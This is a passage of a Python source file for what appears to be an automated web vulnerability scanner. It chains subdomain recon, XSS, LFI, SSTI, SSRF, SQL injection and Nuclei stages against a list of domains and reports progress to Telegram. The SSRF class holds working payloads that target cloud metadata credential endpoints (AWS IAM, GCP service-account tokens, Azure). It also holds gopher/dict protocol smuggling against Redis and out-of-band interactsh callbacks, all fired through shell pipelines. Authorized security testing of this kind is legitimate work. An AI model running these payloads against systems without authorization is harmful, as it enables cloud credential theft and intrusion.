        Initialize with domains file and output directory

        Args:
            domains (str): Path to file containing target domains
            output_file (str): Path to output directory
        """
        self.domains = domains
        self.output_file = output_file
        self.payloads = self._generate_ssrf_payloads()
        self.interactsh_url = self._get_interactsh_url()
        
    def _generate_ssrf_payloads(self):
        """Generate comprehensive SSRF test payloads"""
        base_payloads = [
            # Basic SSRF payloads
            'http://169.254.169.254/latest/meta-data/',
            'http://localhost/admin',
            'http://127.0.0.1:8080',
            'http://[::1]/',
            
            # Cloud metadata endpoints
            'http://169.254.169.254/latest/user-data',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
            'http://metadata.google.internal/computeMetadata/v1beta1/',
            'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
            'http://metadata.azure.internal/metadata/instance?api-version=2020-06-01',
            
            # DNS rebinding payloads
            'http://example.com@127.0.0.1',
            'http://127.0.0.1#@example.com',
            'http://127.0.0.1:80+&@example.com#+@127.0.0.1/',
            
            # URL encoded payloads
            'http://%6c%6f%63%61%6c%68%6f%73%74',
            'http://%4c%6f%63%61%6c%68%6f%73%74',
            
            # IPv6 payloads
            'http://[::]',
            'http://[::ffff:127.0.0.1]',
            
            # Protocol smuggling
            'dict://localhost:6379/info',
            'gopher://localhost:6379/_INFO',
            'ftp://localhost:21',
            'ldap://localhost',
            'tftp://localhost',
            
            # DNS payloads
            'http://localtest.me',
            'http://subdomain.localhost',
            'http://customer1.app.localhost.127.0.0.1.nip.io',
            
            # Out-of-band payloads
            'http://{interactsh_url}',
            'http://{interactsh_url}/?test=ssrf',
            'http://{interactsh_url}/ssrf',
            'http://{interactsh_url}/ping'
        ]
        
        # Add interactsh URL if available
        if hasattr(self, 'interactsh_url') and self.interactsh_url:
            return [p.format(interactsh_url=self.interactsh_url) for p in base_payloads]
        return base_payloads

    def _get_interactsh_url(self):
        """Generate an interactsh URL for blind SSRF detection"""
        try:
            logger.info(f"{color.GREEN}[+] Generating interactsh URL for blind SSRF detection{color.END}")
            result = subprocess.run(
                "interactsh-client -v -json 2>/dev/null | jq -r '.correlation_id' | head -1",
                shell=True,
                capture_output=True,
                text=True,
                timeout=10
            )
            if result.returncode == 0 and result.stdout.strip():
                url = result.stdout.strip()
                logger.info(f"{color.GREEN}[+] Monitoring for interactions at: https://{url}{color.END}")
                return url
        except Exception as e:
            logger.error(f"{color.RED}[-] Failed to generate interactsh URL: {e}{color.END}")
        return None

    def ssrf_cli(self):
        """Test for SSRF vulnerabilities using comprehensive techniques"""
        try:
            # Prepare file paths
            ssrf_urls = f"{self.output_file}/urls/gf-ssrf.txt"
            ssrf_output = f"{self.output_file}/vuln/ssrf.txt"
            os.makedirs(os.path.dirname(ssrf_output), exist_ok=True)
            
            # Phase 1: Basic SSRF testing
            logger.info(f"{color.GREEN}[+] Starting basic SSRF tests{color.END}")
            for payload in self.payloads:
                if '{interactsh_url}' in payload and not self.interactsh_url:
                    continue
                    
                logger.debug(f"{color.BLUE}[*] Testing payload: {payload}{color.END}")
                
                # Use httpx for better detection
                cmd = [
                    'bash', '-c',
                    f"cat {ssrf_urls} | qsreplace '{payload}' | "
                    f"httpx -silent -random-agent -timeout 10 -retries 1 -match-string 'metadata' "
                    f"-mr 'metadata|localhost|127.0.0.1|Internal Server Error' "
                    f"-json | jq -r '.url' | anew {ssrf_output}"
                ]
                subprocess.run(cmd, check=False)

            # Phase 2: Advanced testing with custom tools
            self._advanced_ssrf_tests(ssrf_urls, ssrf_output)
            
            # Phase 3: Analyze results
            self._analyze_ssrf_results(ssrf_output)
            
            return True
            
        except Exception as e:
            logger.exception(f"{color.RED}[-] SSRF test failed: {e}{color.END}")
            return False

    def _advanced_ssrf_tests(self, input_file, output_file):
        """Perform advanced SSRF testing with specialized tools"""
        try:
            logger.info(f"{color.GREEN}[+] Starting advanced SSRF tests{color.END}")
            
            # Test with Gopherus for protocol smuggling
            if self._check_tool_installed('gopherus'):
                logger.info(f"{color.GREEN}[+] Running Gopherus for protocol smuggling{color.END}")
                cmd = f"cat {input_file} | qsreplace 'gopher://localhost:6379/_' | " \
                      f"xargs -I % -P 10 sh -c 'curl -ksm 5 \"%\" | grep \"redis\" && echo \"VULN: %\"' | " \
                      f"anew {output_file}"
                subprocess.run(cmd, shell=True, check=False)
            
            # Test with DNS rebinding
            logger.info(f"{color.GREEN}[+] Testing DNS rebinding vectors{color.END}")
            dns_payloads = [
                'http://example.com@127.0.0.1',
                'http://127.0.0.1#@example.com',
                'http://{interactsh_url}'
            ]
            for payload in dns_payloads:
                if '{interactsh_url}' in payload and not self.interactsh_url:
                    continue
                cmd = f"cat {input_file} | qsreplace '{payload}' | httpx -silent -random-agent | anew {output_file}"
                subprocess.run(cmd, shell=True, check=False)
            
            # Cloud metadata specific tests
            self._test_cloud_metadata(input_file, output_file)
            
        except Exception as e:
            logger.error(f"{color.RED}[-] Advanced SSRF tests failed: {e}{color.END}")

    def _test_cloud_metadata(self, input_file, output_file):
        """Specialized tests for cloud metadata endpoints"""
        try:
            logger.info(f"{color.GREEN}[+] Testing cloud metadata endpoints{color.END}")
            
            cloud_payloads = [
                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
                'http://metadata.azure.internal/metadata/instance?api-version=2020-06-01',
                'http://metadata.cloud.aliyuncs.com/latest/meta-data/',
                'http://100.100.100.200/latest/meta-data/'
            ]
            
            for payload in cloud_payloads:
                cmd = f"cat {input_file} | qsreplace '{payload}' | " \
                      f"httpx -silent -random-agent -match-string 'iam|token|metadata' " \
                      f"-mr 'iam|token|metadata' -json | jq -r '.url' | anew {output_file}"
                subprocess.run(cmd, shell=True, check=False)
                
        except Exception as e:
            logger.error(f"{color.RED}[-] Cloud metadata tests failed: {e}{color.END}")

    def _analyze_ssrf_results(self, results_file):
        """Analyze and summarize SSRF findings"""
        try:
            if not os.path.exists(results_file):
                logger.warning(f"{color.SKY_BLUE}[!] No SSRF results found{color.END}")
                return
                
            with open(results_file, 'r') as f:
                vuln_urls = f.read().splitlines()
                
            if not vuln_urls:
                logger.info(f"{color.BLUE}[-] No SSRF vulnerabilities found{color.END}")
                return
                
            # Categorize findings
            cloud_findings = [u for u in vuln_urls if '169.254.169.254' in u or 'metadata' in u]
            localhost_findings = [u for u in vuln_urls if 'localhost' in u or '127.0.0.1' in u]
            protocol_findings = [u for u in vuln_urls if any(p in u for p in ['dict://', 'gopher://', 'ftp://'])]
            oob_findings = [u for u in vuln_urls if self.interactsh_url and self.interactsh_url in u]
            
            logger.info(f"{color.RED}[!] Found {len(vuln_urls)} potential SSRF vulnerabilities:{color.END}")
            
            if cloud_findings:
                logger.info(f"{color.RED}  Cloud Metadata Endpoints ({len(cloud_findings)}):{color.END}")
                for url in cloud_findings[:3]:
                    logger.info(f"    - {url}")
                    
            if localhost_findings:
                logger.info(f"{color.RED}  Localhost Access ({len(localhost_findings)}):{color.END}")
                for url in localhost_findings[:3]:
                    logger.info(f"    - {url}")
                    
            if protocol_findings:
                logger.info(f"{color.RED}  Protocol Smuggling ({len(protocol_findings)}):{color.END}")
                for url in protocol_findings[:3]:
                    logger.info(f"    - {url}")
                    
            if oob_findings:
                logger.info(f"{color.RED}  Out-of-Band Interactions ({len(oob_findings)}):{color.END}")
                logger.info(f"    - Monitor interactions at: https://{self.interactsh_url}")
                
            # Save categorized results
            self._save_categorized_results(cloud_findings, localhost_findings, protocol_findings, oob_findings)
            
        except Exception as e:
            logger.error(f"{color.RED}[-] Error analyzing results: {e}{color.END}")

    def _save_categorized_results(self, cloud, localhost, protocol, oob):
        """Save categorized results to separate files"""
        try:
            base_dir = f"{self.output_file}/vuln/ssrf"
            os.makedirs(base_dir, exist_ok=True)
            
            if cloud:
                with open(f"{base_dir}/cloud-metadata.txt", 'w') as f:
                    f.write("\n".join(cloud))
                    
            if localhost:
                with open(f"{base_dir}/localhost-access.txt", 'w') as f:
                    f.write("\n".join(localhost))
                    
            if protocol:
                with open(f"{base_dir}/protocol-smuggling.txt", 'w') as f:
                    f.write("\n".join(protocol))
                    
            if oob:
                with open(f"{base_dir}/oob-interactions.txt", 'w') as f:
                    f.write("\n".join(oob))
                    
        except Exception as e:
            logger.error(f"{color.RED}[-] Error saving categorized results: {e}{color.END}")

    def _check_tool_installed(self, tool_name):
        """Check if a required tool is installed"""
        try:
            subprocess.run([tool_name, '--help'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        except FileNotFoundError:
            logger.warning(f"{color.YELLOW}[!] {tool_name} not installed, skipping related tests{color.END}")
            return False

class SQLI:
    """Class to test for SQL Injection vulnerabilities"""

    def __init__(self, domains, output_file):
        """
        Initialize with domains file and output directory

        Args:
            domains (str): Path to file containing target domains
            output_file (str): Path to output directory
        """
        self.domains = domains
        self.output_file = output_file

    def ghauri(self):
        """Test for SQL Injection vulnerabilities using Ghauri"""
        # Open the output file for appending results
        urls = f"{self.output_file}/urls/gf-sqli.txt"
        output = f"{self.output_file}/vuln/sqli.txt"
        with open(output, "a") as f:
            for domain in urls:
                # Construct the ghauri command for each domain
                command = [
                    "ghauri",
                    "-u",
                    f"http://{domain}",
                    "--batch",
                    "--ignore-code",
                    "401,403",
                    "--level",
                    "3",
                    "--banner",
                    "--hostname",
                ]

                try:
                    # Execute the ghauri command and capture output
                    result = subprocess.run(
                        command, capture_output=True, text=True, check=True
                    )

                    # Write the output to the file
                    f.write(f"Results for {domain}:\n")
                    f.write(result.stdout)
                    f.write("\n" + "=" * 40 + "\n\n")

                except subprocess.CalledProcessError as e:
                    # If ghauri encounters an error, log it
                    f.write(f"Error scanning {domain}:\n")
                    f.write(e.stderr)
                    f.write("\n" + "=" * 40 + "\n\n")


class Nuclei:
    """Class to run Nuclei vulnerability scanner"""

    def __init__(self, domains, output_file):
        """
        Initialize with domains file and output directory

        Args:
            domains (str): Path to file containing target domains
            output_file (str): Path to output directory
        """
        self.domains = domains
        self.output_file = output_file

    def basic_nuclei(self):
        """Run basic Nuclei scan on alive hosts"""
        hosts = f"{self.output_file}/hosts/alive-hosts.txt"
        output = f"{self.output_file}/vuln/nuclei-output.txt"
        try:
            nuclei_cmd = ["nuclei", "-l", hosts, "-o", output]
            logger.info(f"{color.GREEN}(+) Nuclei active scanning {color.END}")
            subprocess.run(nuclei_cmd, shell=True, check=True)
        except Exception as e:
            logger.exception(f"{color.RED}(-) Error occurred: {e}{color.END}")

    def dast_nuclei(self):
        """Run DAST Nuclei scan on all URLs"""
        urls = f"{self.output_file}/urls/all-urls.txt"
        output = f"{self.output_file}/vuln/nuclei-dast-output.txt"
        try:
            nuclei_cmd = f"cat {urls} | nuclei --dast -o {output}"
            subprocess.run(nuclei_cmd, check=True, shell=True)
            logger.info(f"{color.GREEN}(+) Nuclei dast active scanning {color.END}")
        except Exception as e:
            logger.exception(f"{color.RED}(-) Error occurred: {e}{color.END}")


class TelegramNotify:
    def __init__(self, telegram_token, telegram_chat_id):
        self.token = telegram_token
        self.chat_id = telegram_chat_id

    def notify_telegram(self, token, chat_id, message):
        """Send Telegram notification"""
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        payload = {"chat_id": chat_id, "text": message, "parse_mode": "Markdown"}

        response = requests.post(url, json=payload)

        if response.status_code == 200:
            logger.info("Notification sent successfully!")
        else:
            logger.error(
                f"Failed to send notification: {response.status_code} - {response.text}"
            )


def done():
    print(
        rf"""{color.GREEN}
  ________            _____                     _         ____                        ______                __   __               __      __   _____
 /_  __/ /_  ___     / ___/_________ _____     (_)____   / __ \____  ____  ___       / ____/___  ____  ____/ /  / /   __  _______/ /__   / /  |__  /
  / / / __ \/ _ \    \__ \/ ___/ __ `/ __ \   / / ___/  / / / / __ \/ __ \/ _ \     / / __/ __ \/ __ \/ __  /  / /   / / / / ___/ //_/  / /    /_ <
 / / / / / /  __/   ___/ / /__/ /_/ / / / /  / (__  )  / /_/ / /_/ / / / /  __/    / /_/ / /_/ / /_/ / /_/ /  / /___/ /_/ / /__/ ,<     \ \  ___/ /
/_/ /_/ /_/\___/   /____/\___/\__,_/_/ /_/  /_/____/  /_____/\____/_/ /_/\___(_)   \____/\____/\____/\__,_/  /_____/\__,_/\___/_/|_|     \_\/____/
   {color.END}

"""
    )


def main():
    parser = argparse.ArgumentParser(
        description="Web Application Vulnerability Scanner"
    )
    parser.add_argument(
        "-d", "--domains", required=True, help="Path to file containing list of domains"
    )
    parser.add_argument("-o", "--output", required=True, help="Output directory name")
    args = parser.parse_args()

    domains = args.domains
    output_file = args.output
    pwd = os.getcwd()
    real_time = date.now()
    formatted_time = real_time.strftime("%Y-%m-%d %H:%M:%S")
    telegram_token = ""
    telegram_chat_id = ""

    # Create an instance of TelegramNotify
    notifier = TelegramNotify(telegram_token, telegram_chat_id)
    notifier.notify_telegram(
        telegram_token,
        telegram_chat_id,
        f"(+) Scan for {domains} Started at {formatted_time}\n" f" Path:{pwd}",
    )

    try:
        # Create directories and notify
        make_dirs = MakeDirectories(output_file)
        make_dirs.mk_dirs()
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, f"(+) Directories created successfully"
        )
        logger.info("Directories created successfully")
    except Exception as e:
        logger.exception("Failed to create directories")
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(-) Failed to create directories"
        )

    try:
        # Execute SubdomainsCollector and notify
        subdomains_collector = SubdomainsCollector(domains, output_file)
        subdomains_collector.subfinder_subs()
        subdomains_collector.probe()
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(+) Subdomain collection completed"
        )
        logger.info("Subdomain collection completed")
    except Exception as e:
        logger.exception("Failed during subdomain collection")
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(-) Subdomain collection failed"
        )

    try:
        # Execute DmarcFinder and notify
        dmarc_finder = DmarcFinder(domains, output_file)
        dmarc_finder.validate_domains()
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(+) DMARC domains validated"
        )
        logger.info("DMARC domains validated")
    except Exception as e:
        logger.exception("Failed during DMARC validation")
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(-) DMARC validation failed"
        )

    try:
        # Execute SubdomainTakeOver and notify
        subdomains_takeover = SubdomainTakeOver(domains, output_file)
        subdomains_takeover.get_cname()
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(+) Subdomain takeover tests completed"
        )
        logger.info("Subdomain takeover tests completed")
    except Exception as e:
        logger.exception("Failed during subdomain takeover tests")
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(-) Subdomain takeover tests failed"
        )

    try:
        # Execute BucketFinder and notify
        bucket_finder = BucketFinder(domains, output_file)
        bucket_finder.buckets_cli()
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(+) BucketFinder scan completed"
        )
    except Exception as e:
        logger.exception("Failed during BucketFinder scan")

    try:
        # Execute `UrlFinder` and notify
        finder = UrlFinder(domains, output_file)
        finder.collect_urls()
        finder.extract_js_files()
        finder.extract_documents()
        finder.extract_js_data_with_mantra()
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(+) URL scan completed"
        )
        logger.info("URL scan completed")
    except Exception as e:
        logger.exception("Failed during URL scan")
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(-) URL scan failed"
        )

    try:
        # Execute XSS and notify
        xss = XSS(domains, output_file)
        xss.xss_cli()
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(+) XSS tests completed"
        )
        logger.info("XSS tests completed")
    except Exception as e:
        logger.exception("Failed during XSS tests")
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(-) XSS tests failed"
        )

    try:
        # Execute OpenRedirect and notify
        open_redirect = OpenRedirect(domains, output_file)
        open_redirect.openredirex()
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(+) Open Redirect scan completed"
        )
        logger.info("Open Redirect scan completed")
    except Exception as e:
        logger.exception("Failed during Open Redirect scan")
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(-) Open Redirect scan failed"
        )

    try:
        # Execute LFI and notify
        lfi = LFI(domains, output_file)
        lfi.lfi_cli()
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(+) LFI test completed"
        )
        logger.info("LFI test completed")
    except Exception as e:
        logger.exception("Failed during LFI test")
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(-) LFI test failed"
        )

    try:
        # Execute SSTI and notify
        ssti = SSTI(domains, output_file)
        ssti.ssti_cli()
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(+) SSTI test completed"
        )
        logger.info("SSTI test completed")
    except Exception as e:
        logger.exception("Failed during SSTI test")
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(-) SSTI test failed"
        )

    try:
        # Execute SSRF and notify
        ssrf = SSRF(domains, output_file)
        ssrf.ssrf_cli()
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(+) SSRF test completed"
        )
        logger.info("SSRF test completed")
    except Exception as e:
        logger.exception("Failed during SSRF test")
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(-) SSRF test failed"
        )

    try:
        # Execute SQLI and notify
        sqli = SQLI(domains, output_file)
        sqli.ghauri()
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(+) SQL Injection test completed"
        )
        logger.info("SQL Injection test completed")
    except Exception as e:
        logger.exception("Failed during SQL Injection test")
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(-) SQL Injection test failed"
        )

    try:
        # Execute Nuclei and notify
        nuclei = Nuclei(domains, output_file)
        nuclei.basic_nuclei()
        nuclei.dast_nuclei()
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(+) Nuclei scan completed"
        )
        logger.info("Nuclei scan completed")
    except Exception as e:
        logger.exception("Failed during Nuclei scan")
        notifier.notify_telegram(
            telegram_token, telegram_chat_id, "(-) Nuclei scan failed"
        )

    try:
        # The scan is done, notify
        finder.download_and_scan_js()
        done()
        notifier.notify_telegram(
            telegram_token,
            telegram_chat_id,
            "(+) Web Application Vulnerability Scan Completed",
        )
        logger.info("Web Application Vulnerability Scan Completed")
    except Exception as e:
        logger.exception("Failed during final scan steps")
        notifier.notify_telegram(
            telegram_token,
            telegram_chat_id,
            "(-) Web Application Vulnerability Scan failed to complete",
        )


if __name__ == "__main__":
    main()
